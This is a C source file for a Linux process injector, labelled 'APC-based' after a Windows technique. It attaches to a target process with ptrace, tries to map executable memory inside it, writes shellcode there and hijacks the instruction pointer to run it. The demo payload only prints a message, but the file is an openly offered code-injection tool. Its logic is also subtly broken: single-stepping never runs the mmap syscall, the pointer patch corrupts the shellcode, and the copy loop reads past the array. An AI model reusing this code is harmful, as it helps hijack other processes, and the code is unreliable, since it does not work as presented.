#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <signal.h>
#include <errno.h>
#include <dlfcn.h>

#define PAYLOAD_SIZE 4096

// Simple payload that prints a message
unsigned char payload_code[] = {
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  // mov rax, 1 (sys_write)
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,  // mov rdi, 1 (stdout)
    0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,  // mov rsi, message (placeholder)
    0x48, 0xc7, 0xc2, 0x1a, 0x00, 0x00, 0x00,  // mov rdx, 26 (message length)
    0x0f, 0x05,                                  // syscall
    0xc3                                         // ret
};

char message[] = "[INJECTED] APC executed!\n";

int inject_apc(pid_t target_pid) {
    struct user_regs_struct regs, backup_regs;
    void *remote_payload;
    void *remote_message;
    long ret;
    
    printf("[INJECTOR] Attaching to process %d\n", target_pid);
    
    // Attach to target process
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("ptrace attach failed");
        return -1;
    }
    
    // Wait for process to stop
    int status;
    waitpid(target_pid, &status, 0);
    
    // Get current registers
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
        perror("ptrace getregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    // Backup registers
    backup_regs = regs;
    
    printf("[INJECTOR] Allocating memory in target process\n");
    
    // Allocate memory for payload using mmap syscall
    regs.rax = 9;  // sys_mmap
    regs.rdi = 0;  // addr
    regs.rsi = PAYLOAD_SIZE;  // length
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;  // flags
    regs.r8 = -1;  // fd
    regs.r9 = 0;   // offset
    
    // Set registers and execute syscall
    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) == -1) {
        perror("ptrace setregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    // Execute syscall
    if (ptrace(PTRACE_SINGLESTEP, target_pid, NULL, NULL) == -1) {
        perror("ptrace singlestep failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    waitpid(target_pid, &status, 0);
    
    // Get result
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
        perror("ptrace getregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    remote_payload = (void *)regs.rax;
    if (remote_payload == MAP_FAILED) {
        printf("[INJECTOR] Memory allocation failed\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    printf("[INJECTOR] Allocated memory at: %p\n", remote_payload);
    
    // Write message to allocated memory
    remote_message = remote_payload + sizeof(payload_code);
    for (int i = 0; i < strlen(message); i++) {
        long data = ptrace(PTRACE_PEEKDATA, target_pid, remote_message + i, NULL);
        data = (data & ~0xff) | message[i];
        ptrace(PTRACE_POKEDATA, target_pid, remote_message + i, data);
    }
    
    // Update payload with message address
    *(void **)(payload_code + 16) = remote_message;
    
    // Write payload to allocated memory
    for (int i = 0; i < sizeof(payload_code); i += sizeof(long)) {
        long data = *(long *)(payload_code + i);
        ptrace(PTRACE_POKEDATA, target_pid, remote_payload + i, data);
    }
    
    printf("[INJECTOR] Payload written to target process\n");
    
    // Restore original registers but set RIP to payload
    backup_regs.rip = (unsigned long long)remote_payload;
    
    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &backup_regs) == -1) {
        perror("ptrace setregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    printf("[INJECTOR] Executing payload via APC simulation\n");
    
    // Continue execution
    if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) == -1) {
        perror("ptrace cont failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    // Wait a moment for execution
    sleep(2);
    
    // Detach from process
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    
    printf("[INJECTOR] APC injection completed\n");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }
    
    pid_t target_pid = atoi(argv[1]);
    
    printf("[INJECTOR] Starting APC-based process injection\n");
    printf("[INJECTOR] Target PID: %d\n", target_pid);
    
    if (inject_apc(target_pid) == 0) {
        printf("[INJECTOR] Injection successful\n");
    } else {
        printf("[INJECTOR] Injection failed\n");
        return 1;
    }
    
    return 0;
}
